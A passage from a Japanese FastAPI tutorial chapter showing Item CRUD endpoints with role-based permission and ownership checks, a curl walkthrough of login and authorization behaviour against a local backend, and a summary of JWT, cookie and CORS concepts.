from app.schemas import UserCreate, UserRead, UserUpdate, ItemCreate, ItemRead, ItemUpdate  # <- ItemCreate, ItemRead, ItemUpdate を追加
from app.permissions import PermissionType, require_permissions, check_resource_ownership, has_role # <- check_resource_ownership, has_role を追加

# ... 既存の User CRUD ...


# === Item CRUD ===

# 所有者チェック不要 (作成するのは必ず自分のアイテム)
@router.post("/items/", response_model=ItemRead, status_code=status.HTTP_201_CREATED)
def create_item(
    data: ItemCreate,
    session: Session = Depends(get_session),
    current_user: User = Depends(require_permissions([PermissionType.ITEM_CREATE])),
) -> Item:
    """ログインユーザーのアイテムを作成する"""
    item = Item(title=data.title, content=data.content)
    current_user.items.append(item)
    session.add(current_user)
    session.commit()
    session.refresh(item)
    return item


@router.get("/items/", response_model=list[ItemRead])
def read_items(
    skip: int = 0,
    limit: int = 100,
    session: Session = Depends(get_session),
    current_user: User = Depends(require_permissions([PermissionType.ITEM_READ])),
) -> list[Item]:
    """ログインユーザーのアイテム一覧を取得する。
    SYSTEM_ADMIN は全ユーザーのアイテムを取得できる。
    """
    # SYSTEM_ADMIN なら全件、 一般ユーザーは自分のアイテムだけ WHERE 絞り込み
    query = select(Item)
    if not has_role(current_user, RoleType.SYSTEM_ADMIN):
        # 一般ユーザーは自分のアイテムのみ
        query = query.where(Item.user_id == current_user.id)
    items = session.execute(
        query.offset(skip).limit(limit).order_by(Item.id)
    ).scalars().all()
    return list(items)


@router.get("/items/{item_id}", response_model=ItemRead)
def read_item(
    item_id: int,
    session: Session = Depends(get_session),
    current_user: User = Depends(require_permissions([PermissionType.ITEM_READ])),
) -> Item:
    """アイテムを取得する。自分のアイテムか SYSTEM_ADMIN のみ"""
    item = session.execute(
        select(Item).where(Item.id == item_id)
    ).scalar_one_or_none()
    if item is None:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Item not found")
    check_resource_ownership(owner_id=item.user_id, current_user=current_user)
    return item


@router.patch("/items/{item_id}", response_model=ItemRead)
def update_item(
    item_id: int,
    data: ItemUpdate,
    session: Session = Depends(get_session),
    current_user: User = Depends(require_permissions([PermissionType.ITEM_UPDATE])),
) -> Item:
    """アイテムを更新する。自分のアイテムか SYSTEM_ADMIN のみ"""
    item = session.execute(
        select(Item).where(Item.id == item_id)
    ).scalar_one_or_none()
    if item is None:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Item not found")
    check_resource_ownership(owner_id=item.user_id, current_user=current_user)

    if data.title is not None:
        item.title = data.title
    if data.content is not None:
        item.content = data.content
    session.add(item)
    session.commit()
    session.refresh(item)
    return item


@router.delete("/items/{item_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_item(
    item_id: int,
    session: Session = Depends(get_session),
    current_user: User = Depends(require_permissions([PermissionType.ITEM_DELETE])),
) -> None:
    """アイテムを削除する。自分のアイテムか SYSTEM_ADMIN のみ"""
    item = session.execute(
        select(Item).where(Item.id == item_id)
    ).scalar_one_or_none()
    if item is None:
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Item not found")
    # permissions.py に定義したヘルパーで所有者チェック。 ロジックが 1 箇所に集約されている
    check_resource_ownership(owner_id=item.user_id, current_user=current_user)
    session.delete(item)
    session.commit()
```

---

## 12. curl で一連の流れを確認

全体の流れを curl で確認します。

```bash
BASE_URL="http://backend:8000/api/v1"

# 1. ログイン (sys_admin)
TOKEN=$(curl -s -X POST "$BASE_URL/login" \
  -H 'Content-Type: application/json' \
  -d '{"username": "sys_admin", "password": "admin"}' | jq -r .access_token)
echo "TOKEN: $TOKEN"

# 2. ユーザー一覧 (認証付き)
curl -s -H "Authorization: Bearer $TOKEN" "$BASE_URL/users/" | jq .

# 3. アイテム作成
curl -s -X POST "$BASE_URL/items/" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"title": "My Item", "content": "Hello World"}' | jq .

# 4. アイテム一覧
curl -s -H "Authorization: Bearer $TOKEN" "$BASE_URL/items/" | jq .

# 5. 権限なしユーザーでログイン
TOKEN2=$(curl -s -X POST "$BASE_URL/login" \
  -H 'Content-Type: application/json' \
  -d '{"username": "loc_operator", "password": "operator"}' | jq -r .access_token)

# 6. ユーザー作成を試みると 403
curl -s -X POST "$BASE_URL/users/" \
  -H "Authorization: Bearer $TOKEN2" \
  -H "Content-Type: application/json" \
  -d '{"username": "test", "password": "test", "role_ids": [3]}' | jq .
# {"detail": "Permission denied"}

# 7. loc_operator でアイテム作成 (自分のアイテムとして作れる)
curl -s -X POST "$BASE_URL/items/" \
  -H "Authorization: Bearer $TOKEN2" \
  -H "Content-Type: application/json" \
  -d '{"title": "Operator Item", "content": "My content"}' | jq .

# 8. loc_operator のアイテム一覧 (自分のだけ見える)
curl -s -H "Authorization: Bearer $TOKEN2" "$BASE_URL/items/" | jq .
```

---

## まとめ

この章では以下を学びました：

- **JWT**: 署名付きトークンでステートレスな認証を実現
- **HttpOnly Cookie + SameSite=Lax**: XSS / CSRF に強いトークン保持方式
- **Cookie + Bearer の両方サポート**: ブラウザ(Cookie) と API クライアント(Bearer) の両立
- **`Depends(get_current_user)`**: FastAPI の DI で認証ガードを実現
- **ロールベースの認可**: `PermissionType` と `require_permissions` で柔軟な権限制御
- **Item の所有者チェック**: 一般ユーザーは自分の Item だけ、SYSTEM_ADMIN は全操作可
- **CORS の基礎**: 同一オリジンポリシーと CORS の仕組み(本教材は Chapter 10 のリバースプロキシで同一オリジンに揃えるため、CORS 設定自体は不要)

次章では **構造化ログとエラーハンドリング** を実装して、運用時のデバッグ・監視に備えます。

---

## 次の章

[Chapter 7: 構造化ログとエラーハンドリング ->](../chapter07/README.md)
